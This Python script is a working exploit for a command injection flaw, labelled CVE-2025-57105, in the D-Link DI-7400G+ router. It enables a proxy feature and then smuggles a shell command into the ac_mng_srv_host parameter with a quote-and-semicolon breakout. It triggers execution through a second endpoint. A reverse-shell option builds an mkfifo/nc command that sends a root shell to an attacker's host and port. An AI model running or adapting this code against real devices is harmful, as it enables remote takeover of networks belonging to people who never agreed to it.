#!/usr/bin/env python3

import sys
import argparse
import time
import requests
from typing import Optional
from dataclasses import dataclass
from enum import Enum
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


class ExploitResult(Enum):
    SUCCESS = "success"
    FAILED = "failed"
    ERROR = "error"


@dataclass
class TargetConfig:
    base_url: str
    timeout: int = 10
    verify_ssl: bool = False


class DLinkDI7400Exploit:
    
    SETUP_ENDPOINT = "/mng_platform.asp"
    TRIGGER_ENDPOINT = "/wayos_ac_server.asp"
    
    def __init__(self, config: TargetConfig):
        self.config = config
        self.session = requests.Session()
    
    def _request(self, method: str, endpoint: str, **kwargs) -> Optional[requests.Response]:
        url = f"{self.config.base_url}{endpoint}"
        kwargs.setdefault("timeout", self.config.timeout)
        kwargs.setdefault("verify", self.config.verify_ssl)
        kwargs.setdefault("allow_redirects", True)
        
        try:
            return self.session.request(method, url, **kwargs)
        except requests.exceptions.RequestException:
            return None
    
    def check_alive(self) -> bool:
        response = self._request("GET", "/")
        return response is not None and response.status_code == 200
    
    def enable_prerequisites(self) -> bool:
        params = {
            "opt": "proxy",
            "proxy_ac_status": "1",
            "ac_server_enable": "1"
        }
        
        response = self._request("GET", self.SETUP_ENDPOINT, params=params)
        return response is not None and response.status_code == 200
    
    def inject_payload(self, command: str) -> bool:
        payload = f'evil"; {command}; #'
        
        params = {
            "opt": "proxy",
            "ac_mng_srv_host": payload
        }
        
        response = self._request("GET", self.SETUP_ENDPOINT, params=params)
        return response is not None
    
    def trigger_execution(self) -> bool:
        params = {
            "opt": "proxy"
        }
        
        response = self._request("GET", self.TRIGGER_ENDPOINT, params=params)
        return response is not None
    
    def execute_command(self, command: str) -> ExploitResult:
        if not self.check_alive():
            return ExploitResult.ERROR
        
        if not self.enable_prerequisites():
            return ExploitResult.FAILED
        
        time.sleep(0.5)
        
        if not self.inject_payload(command):
            return ExploitResult.FAILED
        
        time.sleep(0.5)
        
        if not self.trigger_execution():
            return ExploitResult.FAILED
        
        return ExploitResult.SUCCESS
    
    def verify_rce(self) -> bool:
        test_file = "/tmp/poc_verify.txt"
        test_command = f"echo CVE-2025-57105 > {test_file}"
        
        result = self.execute_command(test_command)
        if result != ExploitResult.SUCCESS:
            return False
        
        time.sleep(1)
        
        verify_command = f"cat {test_file}"
        result = self.execute_command(verify_command)
        
        return result == ExploitResult.SUCCESS


def parse_arguments() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="CVE-2025-57105: D-Link DI-7400G+ Command Injection",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    parser.add_argument("target", help="Target IP or URL")
    parser.add_argument("-c", "--command", default="id", help="Command to execute")
    parser.add_argument("-t", "--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--reverse-shell", action="store_true", help="Spawn reverse shell")
    parser.add_argument("--lhost", help="Local IP for reverse shell")
    parser.add_argument("--lport", type=int, default=4444, help="Local port for reverse shell")
    
    return parser.parse_args()


def main() -> int:
    args = parse_arguments()
    
    base_url = args.target.rstrip("/")
    if not base_url.startswith("http"):
        base_url = f"http://{base_url}"
    
    config = TargetConfig(base_url=base_url, timeout=args.timeout)
    exploit = DLinkDI7400Exploit(config)
    
    print(f"\n[*] Target: {config.base_url}")
    print(f"[*] CVE-2025-57105: D-Link DI-7400G+ Command Injection\n")
    
    if not exploit.check_alive():
        print("[-] Target is not reachable")
        return 1
    
    print("[+] Target is alive")
    
    if args.reverse_shell:
        if not args.lhost:
            print("[-] --lhost required for reverse shell")
            return 1
        
        command = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f"
        print(f"[*] Spawning reverse shell to {args.lhost}:{args.lport}")
    else:
        command = args.command
        print(f"[*] Executing command: {command}")
    
    print("[*] Step 1: Enabling prerequisites (proxy_ac_status, ac_server_enable)")
    
    if not exploit.enable_prerequisites():
        print("[-] Failed to enable prerequisites")
        return 1
    
    print("[+] Prerequisites enabled")
    
    print("[*] Step 2: Injecting payload into ac_mng_srv_host")
    
    if not exploit.inject_payload(command):
        print("[-] Failed to inject payload")
        return 1
    
    print("[+] Payload injected")
    
    print("[*] Step 3: Triggering execution via wayos_ac_server.asp")
    
    if not exploit.trigger_execution():
        print("[-] Failed to trigger execution")
        return 1
    
    print(f"\n[!] COMMAND INJECTION SUCCESSFUL")
    print(f"[+] Command executed: {command}")
    
    return 0


if __name__ == "__main__":
    sys.exit(main())
